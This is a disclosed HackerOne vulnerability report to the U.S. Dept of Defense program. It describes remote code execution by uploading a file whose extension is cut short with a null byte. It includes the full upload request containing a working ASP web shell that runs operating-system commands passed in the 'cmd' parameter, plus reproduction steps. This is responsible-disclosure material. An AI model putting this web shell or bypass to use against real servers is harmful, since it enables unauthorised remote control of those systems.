---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/command-injection-generic
  - env/web
substate: "resolved"
weakness: "Command Injection - Generic"
enriched: true
body: true
date: 2023-12-21
submitted: 2023-07-06T22:08:16.576Z
bounty_usd: null
votes: 33
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "pizzapower"
source: "https://hackerone.com/reports/2054184"
title: "RCE via File Upload  with a Null Byte Truncated File Extension at https://██████/"
---
# RCE via File Upload  with a Null Byte Truncated File Extension at https://██████/

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 33 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2023-12-21

- Report: [https://hackerone.com/reports/2054184](https://hackerone.com/reports/2054184)
- CWE: Command Injection - Generic
- Submitted: 2023-07-06T22:08:16.576Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi,

I found "repos" at `https://███/` and `https://c█████████/` and this one (which doesn't have the file upload functionality appearing on the DOM, but it still may be there) `https://███████`.  There may be more, I had to fuzz a lot to find these. 

These repos contain file upload functionality. I found that if you place a null byte between file extensions, you can upload files with malicious extensions. 

Running the `dir` command at the uploaded file `https://████████/savefiles/poc.asp?cmd=dir`  - the shell has been deleted for security purposes. Let me know if you want me to reupload it. 

██████████

The request from burp - note the null byte: 

█████



*** Reproduction ***

1. Navigate to `https://███/`

2. Submit a file upload the same as the request I made above. Make sure there is a null byte between asp and png. 

3. Visit `https://████████/savefiles/poc.asp` and run commands. 


## Impact

Everything could be compromised.

## System Host(s)
████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Here is the actual request, but I'm not sure how well the null byte will translate. 

```
POST /repo/orbital/repo.asp?fileToUpload=pizza.asp HTTP/1.1
Host: ███
Cookie: ASPSESSIONIDCCSBDDQT=CAJLLPMCPOBLODENMGDGMADC
Content-Length: 1306
Sec-Ch-Ua: 
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7RcvHwqSCmAtKCIB
X-Requested-With: XMLHttpRequest
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Sec-Ch-Ua-Platform: ""
Origin: https://███████
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://████████/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundary7RcvHwqSCmAtKCIB
Content-Disposition: form-data; name="myfile"; filename="poc.asp.png"


<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>


<HTML>
<BODY>
<FORM action="" method="GET">
<input type="text" name="cmd" size=45 value="<%= szCMD %>">
<input type="submit" value="Run">
</FORM>
<PRE>
<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
<%Response.Write(Request.ServerVariables("server_name"))%>
<p>
<b>The server's port:</b>
<%Response.Write(Request.ServerVariables("server_port"))%>
</p>
<p>
<b>The server's software:</b>
<%Response.Write(Request.ServerVariables("server_software"))%>
</p>
<p>
<b>The server's local address:</b>
<%Response.Write(Request.ServerVariables("LOCAL_ADDR"))%>
<% szCMD = request("cmd")
thisDir = getCommandOutput("cmd /c" & szCMD)
Response.Write(thisDir)%>
</p>
<br>
</BODY>
</HTML>



------WebKitFormBoundary7RcvHwqSCmAtKCIB--

```

*** Reproduction ***

1. Navigate to `https://███/`

2. Submit a file upload the same as the request I made above. Make sure there is a null byte between asp and png. 

3. Visit `https://████/savefiles/poc.asp` and run commands.

## Suggested Mitigation/Remediation Actions

## Timeline

- **Draft Started**
- **Report Filed**
- **2023-07-06** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **2023-07-07** @pizzapower: Oh, and the `500` response when uploading the file is normal. The file still uploads.
- **Report Needs More Info**
- **Report New**
- **2023-07-07** @pizzapower: I've uploaded a video. The shell is live at 'https://██████████/savefiles/poc.asp` for testing. Please let me know when I can delete it. 

██████████
- **Report Severity Updated**
- **Report Triaged**
- **2023-07-07** @pizzapower: Thanks! RCE is not a critical? Hahaha
- **Report Severity Updated**
- **Report Resolved**
- **2023-07-31** @agent-p1: Greetings!
@pizzapower  Because of this report  and your other two Jenkins admin submissions you have been selected as our Researcher of the Month. Would you like your name to be on the certificate that is tweeted out? If so, would you provide me your name for that? Do you have a twitter handle for us to tag you in? If you do not, or would not like to, then we would use you Hackerone username. Thank you!
Regards,
The DoD VDP team
- **2023-07-31** @pizzapower: Hey, obviously this finding is mine, but I didn't report any Jenkins admin findings from what I remember.  I had an SQLi, an XSS or three, and a zip file thingy from this month. I think you must have me confused with another person, lol. But if you did mean me, you can use my name and twitter.

Matt Moreschi
pizzap0w3r on twitter

Have a good one!
- **2023-07-31** @agent-p1: Yes we meant you apologies that was a typo. We will get your cert written up immediately. Thank you for your quick response
- **2023-07-31** @pizzapower: Awesome! Thanks a bunch!
- **2023-11-22** @pizzapower: Good morning! No hurry, but when someone gets a chance, can we disclose this one please? Thanks!
- **2023-11-22** @agent-z1: Greetings @pizzapower ,

Please request the disclosure of the report through the H1 interface.  You should have the option to request disclosure when viewing this report.  That will drop it in a queue where we can redact the necessary information and approve it for public release.  If you have any questions please let us know.

Regards,
The VDP Team
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
